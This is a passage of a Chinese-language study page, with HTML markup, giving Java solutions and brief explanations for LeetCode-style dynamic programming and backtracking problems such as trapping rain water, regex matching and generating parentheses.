<span class="hljs-keyword">int</span> height = matrix.length;<br>    <span class="hljs-keyword">int</span> width = matrix[<span class="hljs-number">0</span>].length;<br>    <span class="hljs-keyword">int</span> maxSide = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 相当于已经预处理新增第一行、第一列均为0</span><br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[height + <span class="hljs-number">1</span>][width + <span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> row = <span class="hljs-number">0</span>; row &lt; height; row++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> col = <span class="hljs-number">0</span>; col &lt; width; col++) &#123;<br>            <span class="hljs-keyword">if</span> (matrix[row][col] == <span class="hljs-string">&#x27;1&#x27;</span>) &#123;<br>                dp[row + <span class="hljs-number">1</span>][col + <span class="hljs-number">1</span>] = Math.min(Math.min(dp[row + <span class="hljs-number">1</span>][col], dp[row][col + <span class="hljs-number">1</span>]), dp[row][col]) + <span class="hljs-number">1</span>;<br>                maxSide = Math.max(maxSide, dp[row + <span class="hljs-number">1</span>][col + <span class="hljs-number">1</span>]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> maxSide * maxSide;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-17-完全平方数"><a href="#6-17-完全平方数" class="headerlink" title="6.17 完全平方数"></a>6.17 完全平方数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">numSquares</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;<br>        dp[i] = i;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = <span class="hljs-number">1</span>;i - j*j &gt;=<span class="hljs-number">0</span>; j++)&#123;<br>            dp[i] = Math.min(dp[i - j * j] + <span class="hljs-number">1</span>,dp[i]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[n];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-18-比特位计数"><a href="#6-18-比特位计数" class="headerlink" title="6.18 比特位计数"></a>6.18 比特位计数</h2><p>对于所有的数字，只有两类：</p><p>奇数：二进制表示中，奇数一定比前面那个偶数多一个 1，因为多的就是最低位的 1。<br>          举例：<br>         0 = 0       1 = 1<br>         2 = 10      3 = 11<br>偶数：二进制表示中，偶数中 1 的个数一定和除以 2 之后的那个数一样多。因为最低位是 0，除以 2 就是右移一位，也就是把那个 0 抹掉而已，所以 1 的个数是不变的。<br>           举例：<br>          2 = 10       4 = 100       8 = 1000<br>          3 = 11       6 = 110       12 = 1100<br>另外，0 的 1 个数为 0，于是就可以根据奇偶性开始遍历计算了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] countBits(<span class="hljs-keyword">int</span> num) &#123;<br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[num + <span class="hljs-number">1</span>];<br>    res[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= num; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>)&#123;<br>            res[i] = res[i - <span class="hljs-number">1</span>] + <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            res[i] = res[i / <span class="hljs-number">2</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-19-正则表达式匹配"><a href="#6-19-正则表达式匹配" class="headerlink" title="6.19 正则表达式匹配"></a>6.19 正则表达式匹配</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isMatch</span><span class="hljs-params">(String s, String p)</span> </span>&#123;<br>    <span class="hljs-comment">//s待匹配，p是正则</span><br>    <span class="hljs-keyword">int</span> n = s.length();<br>    <span class="hljs-keyword">int</span> m = p.length();<br>    <span class="hljs-keyword">boolean</span>[][] dp= <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[n+<span class="hljs-number">1</span>][m+<span class="hljs-number">1</span>];<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= n; i++)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j&lt;= m; j++)&#123;<br>            <span class="hljs-comment">//空正则</span><br>            <span class="hljs-keyword">if</span> (j == <span class="hljs-number">0</span>)&#123;<br>                dp[i][j] = i == <span class="hljs-number">0</span>;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//非空正则 两种情况*和非*</span><br>                <span class="hljs-keyword">if</span> (p.charAt(j-<span class="hljs-number">1</span>) != <span class="hljs-string">&#x27;*&#x27;</span>)&#123;<br>                    <span class="hljs-keyword">if</span> (i &gt; <span class="hljs-number">0</span> &amp;&amp; (s.charAt(i-<span class="hljs-number">1</span>) == p.charAt(j-<span class="hljs-number">1</span>) || p.charAt(j-<span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;.&#x27;</span>))&#123;<br>                        dp[i][j] = dp[i-<span class="hljs-number">1</span>][j-<span class="hljs-number">1</span>];<br>                    &#125;<br>                &#125;<span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//遇到*，分为看和不看</span><br>                    <span class="hljs-comment">//看</span><br>                    <span class="hljs-keyword">if</span> (i &gt;=<span class="hljs-number">1</span> &amp;&amp; j&gt;=<span class="hljs-number">2</span> &amp;&amp;(s.charAt(i-<span class="hljs-number">1</span>) == p.charAt(j-<span class="hljs-number">2</span>) || p.charAt(j-<span class="hljs-number">2</span>) == <span class="hljs-string">&#x27;.&#x27;</span>))&#123;<br>                        dp[i][j] |= dp[i-<span class="hljs-number">1</span>][j];<br>                    &#125;<br>                    <span class="hljs-comment">//不看</span><br>                    <span class="hljs-keyword">if</span> (j&gt;=<span class="hljs-number">2</span>)&#123;<br>                        dp[i][j] |= dp[i][j-<span class="hljs-number">2</span>];<br>                    &#125;<br>                &#125;<br><br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> dp[n][m];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-20-最长有效括号"><a href="#6-20-最长有效括号" class="headerlink" title="6.20 最长有效括号"></a>6.20 最长有效括号</h2><p>​        我们定义$ \textit{dp}[i]$ 表示以下标 i 字符结尾的最长有效括号的长度。我们将 $\textit{dp}$ 数组全部初始化为 0 。显然有效的子串一定以 $\text{‘)’}$ 结尾，因此我们可以知道以 $\text{‘(’}$结尾的子串对应的 $\textit{dp}$ 值必定为 0 ，我们只需要求解 $\text{‘)’}$ 在 $\textit{dp}$ 数组中对应位置的值。</p><p>我们从前往后遍历字符串求解 $\textit{dp}$ 值，我们每两个字符检查一次：</p><p>$s[i] = \text{‘)’}$ 且 $s[i - 1] = \text{‘(’}$，也就是字符串形如 “……()”，我们可以推出：</p><p>$\textit{dp}[i]=\textit{dp}[i-2]+2$</p><p>我们可以进行这样的转移，是因为结束部分的 “()” 是一个有效子字符串，并且将之前有效子字符串的长度增加了2 。</p><p>$s[i] = \text{‘)’}$且$ s[i - 1] = \text{‘)’}$，也就是字符串形如 “……))”，我们可以推出：<br>如果$ s[i - \textit{dp}[i - 1] - 1] = \text{‘(’}$，那么</p><script type="math/tex; mode=display">\textit{dp}[i]=\textit{dp}[i-1]+\textit{dp}[i-\textit{dp}[i-1]-2]+2</script><p>我们考虑如果倒数第二个 $\text{‘)’}$是一个有效子字符串的一部分（记作$sub_s$），对于最后一个 $\text{‘)’}$ ，如果它是一个更长子字符串的一部分，那么它一定有一个对应的 $\text{‘(’}$，且它的位置在倒数第二个 $\text{‘)’}$ 所在的有效子字符串的前面（也就是 $sub_s$的前面）。因此，如果子字符串 $sub_s$的前面恰好是 $\text{‘(’}$ ，那么我们就用 2 加上$ sub_s$的长度$（\textit{dp}[i-1]）$去更新 $\textit{dp}[i]$。同时，我们也会把有效子串 $“(sub_s)”$之前的有效子串的长度也加上，也就是再加上 $\textit{dp}[i-\textit{dp}[i-1]-2]$。</p><p>最后的答案即为 $\textit{dp}$ 数组中的最大值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">longestValidParentheses</span><span class="hljs-params">(String s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[s.length()];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; s.length(); i++)&#123;<br>        <span class="hljs-keyword">if</span>(s.charAt(i) == <span class="hljs-string">&#x27;)&#x27;</span>)&#123;<br>            <span class="hljs-keyword">if</span>(s.charAt(i - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                dp[i] = (i &gt;= <span class="hljs-number">2</span> ? dp[i - <span class="hljs-number">2</span>] : <span class="hljs-number">0</span>) + <span class="hljs-number">2</span>;<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(i - dp[i - <span class="hljs-number">1</span>] &gt; <span class="hljs-number">0</span> &amp;&amp; s.charAt(i - dp[i - <span class="hljs-number">1</span>] - <span class="hljs-number">1</span>) == <span class="hljs-string">&#x27;(&#x27;</span>)&#123;<br>                dp[i] = dp[i - <span class="hljs-number">1</span>] + ((i - dp[i - <span class="hljs-number">1</span>]) &gt;= <span class="hljs-number">2</span> ? dp[i - dp[i - <span class="hljs-number">1</span>] - <span class="hljs-number">2</span>] : <span class="hljs-number">0</span>) + <span class="hljs-number">2</span>;<br>            &#125;<br>        &#125;<br>        res = Math.max(res, dp[i]);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-21-接雨水"><a href="#6-21-接雨水" class="headerlink" title="6.21 接雨水"></a>6.21 接雨水</h2><p>当前位置接水=min(right_max,left_max) - height[i]</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">trap</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] height)</span> </span>&#123;<br>     <span class="hljs-keyword">if</span>(height == <span class="hljs-keyword">null</span> || height.length == <span class="hljs-number">0</span>)&#123;<br>         <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>     &#125;<br>     <span class="hljs-keyword">int</span> n = height.length;<br>     <span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">int</span>[] left_max = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>     <span class="hljs-keyword">int</span>[] right_max = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];<br>     left_max[<span class="hljs-number">0</span>] = height[<span class="hljs-number">0</span>];<br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++)&#123;<br>         left_max[i] = Math.max(left_max[i - <span class="hljs-number">1</span>], height[i]);<br>     &#125;<br>     right_max[n - <span class="hljs-number">1</span>] = height[n - <span class="hljs-number">1</span>];<br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = n - <span class="hljs-number">2</span>; j &gt;= <span class="hljs-number">0</span>; j--)&#123;<br>         right_max[j] = Math.max(right_max[j + <span class="hljs-number">1</span>], height[j]);<br>     &#125;<br>     <span class="hljs-comment">//第一个和最后一个不能装水</span><br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = <span class="hljs-number">1</span>; k &lt; n - <span class="hljs-number">1</span>; k++)&#123;<br>         res += Math.min(left_max[k], right_max[k]) - height[k];<br>     &#125;<br>     <span class="hljs-keyword">return</span> res;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="6-22-戳气球"><a href="#6-22-戳气球" class="headerlink" title="6.22 戳气球"></a>6.22 戳气球</h2><p>添加虚拟气球和寻找状态选择是重点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">maxCoins</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-comment">//在nums两侧添加虚拟气球构成新数组</span><br>    <span class="hljs-keyword">int</span>[] points = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">2</span>];<br>    points[<span class="hljs-number">0</span>] = points[n + <span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)&#123;    <br>        points[i] = nums[i - <span class="hljs-number">1</span>];<br>    &#125; <br>    <span class="hljs-comment">//dp[i][j]代表(i,j)获得硬币最大数量</span><br>    <span class="hljs-comment">//base case 初始化0</span><br>    <span class="hljs-keyword">int</span>[][] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n + <span class="hljs-number">2</span>][n + <span class="hljs-number">2</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = n; i &gt;= <span class="hljs-number">0</span>; i--)&#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; n + <span class="hljs-number">2</span>; j++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k = i + <span class="hljs-number">1</span>; k &lt; j; k++)&#123;<br>                dp[i][j] = Math.max(<br>                    dp[i][j],<br>                    dp[i][k] + dp[k][j] + points[i]*points[j]*points[k]);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> dp[<span class="hljs-number">0</span>][n + <span class="hljs-number">1</span>];<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-23-跳跃游戏"><a href="#6-23-跳跃游戏" class="headerlink" title="6.23 跳跃游戏"></a>6.23 跳跃游戏</h2><p> 贪心问题</p><p>遍历每个位置，若当前位置可到达，则根据当前位置i和nums[i]更新覆盖范围</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">canJump</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> mostLength = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">int</span> n = nums.length;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i &lt;= mostLength)&#123;<br>            mostLength = Math.max(mostLength, nums[i] + i);<br>            <span class="hljs-keyword">if</span>(mostLength &gt;= n - <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="7-回溯"><a href="#7-回溯" class="headerlink" title="7. 回溯"></a>7. 回溯</h1><h2 id="7-1-全排列"><a href="#7-1-全排列" class="headerlink" title="7.1 全排列"></a>7.1 全排列</h2><p>选择LinkedList是因为要在链表尾频繁操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br> <span class="hljs-keyword">public</span> List&lt;List&lt;Integer&gt;&gt; permute(<span class="hljs-keyword">int</span>[] nums) &#123;<br>     LinkedList&lt;Integer&gt; track = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>     backtrack(nums, track);<br>     <span class="hljs-keyword">return</span> res;<br> &#125;<br><br> <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, LinkedList&lt;Integer&gt; track)</span></span>&#123;<br>     <span class="hljs-comment">//结束条件</span><br>     <span class="hljs-keyword">if</span>(track.size() == nums.length)&#123;<br>         res.add(<span class="hljs-keyword">new</span> LinkedList(track));<br>         <span class="hljs-keyword">return</span>;<br>     &#125;<br><br>     <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.length; i++)&#123;<br>         <span class="hljs-comment">//不满足条件</span><br>         <span class="hljs-keyword">if</span>(track.contains(nums[i]))&#123;<br>             <span class="hljs-keyword">continue</span>;<br>         &#125;<br>         <span class="hljs-comment">//做选择</span><br>         track.add(nums[i]);<br>         backtrack(nums,track);<br>         track.removeLast();<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><h2 id="7-2-子集"><a href="#7-2-子集" class="headerlink" title="7.2 子集"></a>7.2 子集</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;List&lt;Integer&gt;&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br><br>List&lt;List&lt;Integer&gt;&gt; subsets(<span class="hljs-keyword">int</span>[] nums) &#123;<br>    <span class="hljs-comment">// 记录走过的路径</span><br>    LinkedList&lt;Integer&gt; track = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    backtrack(nums, <span class="hljs-number">0</span>, track);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> start, LinkedList&lt;Integer&gt; track)</span> </span>&#123;<br>    res.add(<span class="hljs-keyword">new</span> LinkedList(track));<br>    <span class="hljs-comment">// 注意 i 从 start 开始递增</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = start; i &lt; nums.length(); i++) &#123;<br>        <span class="hljs-comment">// 做选择</span><br>        track.add(nums[i]);<br>        <span class="hljs-comment">// 回溯</span><br>        backtrack(nums, i + <span class="hljs-number">1</span>, track);<br>        <span class="hljs-comment">// 撤销选择</span><br>        track.removeLast();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-3-括号生成"><a href="#7-3-括号生成" class="headerlink" title="7.3 括号生成"></a>7.3 括号生成</h2><p>两个规则：</p><ul><li>一个「合法」括号组合的左括号数量一定等于右括号数量，这个很好理解。</li><li>对于一个「合法」的括号字符串组合 <code>p</code>，必然对于任何 <code>0 &lt;= i &lt; len(p)</code> 都有：子串 <code>p[0..i]</code> 中左括号的数量都大于或等于右括号的数量。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">generateParenthesis</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n)</span> </span>&#123;<br>    <span class="hljs-comment">//结果数组</span><br>    LinkedList&lt;String&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>    <span class="hljs-comment">//回溯路径</span><br>    StringBuilder track = <span class="hljs-keyword">new</span> StringBuilder();<br>    <span class="hljs-comment">// 可用的左括号和右括号数量初始化为 n</span><br>    backtrack(n, n, track, res);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(<span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right, StringBuilder track, LinkedList&lt;String&gt; res)</span></span>&#123;<br>    <span class="hljs-comment">//剩下可用左括号多，不合法</span><br>    <span class="hljs-keyword">if</span>(left &gt; right)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//剩余可用&lt;0,不合法</span><br>    <span class="hljs-keyword">if</span>(left &lt; <span class="hljs-number">0</span> || right &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//剩余括号正好为0合法</span><br>    <span class="hljs-keyword">if</span>(left == <span class="hljs-number">0</span> &amp;&amp; right == <span class="hljs-number">0</span>)&#123;<br>        String s = track.toString();<br>        res.add(s);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//放左括号</span><br>    track.append(<span class="hljs-string">&#x27;(&#x27;</span>);<br>    backtrack(left - <span class="hljs-number">1</span>, right, track, res);<br>    track.deleteCharAt(track.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//放右括号</span><br>    track.append(<span class="hljs-string">&#x27;)&#x27;</span>);<br>    backtrack(left, right - <span class="hljs-number">1</span>, track, res);<br>    track.deleteCharAt(track.length() - <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="7-4-电话号码的字母组合"><a href="#7-4-电话号码的字母组合" class="headerlink" title="7.4 电话号码的字母组合"></a>7.4 电话号码的字母组合</h2><p>借鉴子集思路</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title">letterCombinations</span><span class="hljs-params">(String digits)</span> </span>&#123;<br>    List&lt;String&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;String&gt;();<br>    <span class="hljs-keyword">if</span> (digits.length() == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>    Map&lt;Character, String&gt; phoneMap = <span class="hljs-keyword">new</span> HashMap&lt;Character, String&gt;() &#123;&#123;<br>        put(<span class="hljs-string">&#x27;2&#x27;</span>, <span class="hljs-string">&quot;abc&quot;</span>);<br>        put(<span class="hljs-string">&#x27;3&#x27;</span>, <span class="hljs-string">&quot;def&quot;</span>);<br>        put(<span class="hljs-string">&#x27;4&#x27;</span>, <span class="hljs-string">&quot;ghi&quot;</span>);<br>        put(<span class="hljs-string">&#x27;5&#x27;</span>, <span class="hljs-string">&quot;jkl&quot;</span>);<br>        put(<span class="hljs-string">&#x27;6&#x27;</span>, <span class="hljs-string">&quot;mno&quot;</span>);<br>        put(<span class="hljs-string">&#x27;7&#x27;</span>, <span class="hljs-string">&quot;pqrs&quot;</span>);<br>        put(<span class="hljs-string">&#x27;8&#x27;</span>, <span class="hljs-string">&quot;tuv&quot;</span>);<br>        put(<span class="hljs-string">&#x27;9&#x27;</span>, <span class="hljs-string">&quot;wxyz&quot;</span>);<br>    &#125;&#125;;<br>    StringBuilder track = <span class="hljs-keyword">new</span> StringBuilder();<br>    backtrack(res, track, digits, <span class="hljs-number">0</span>, phoneMap);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">backtrack</span><span class="hljs-params">(List&lt;String&gt; res, StringBuilder track, String digits, <span 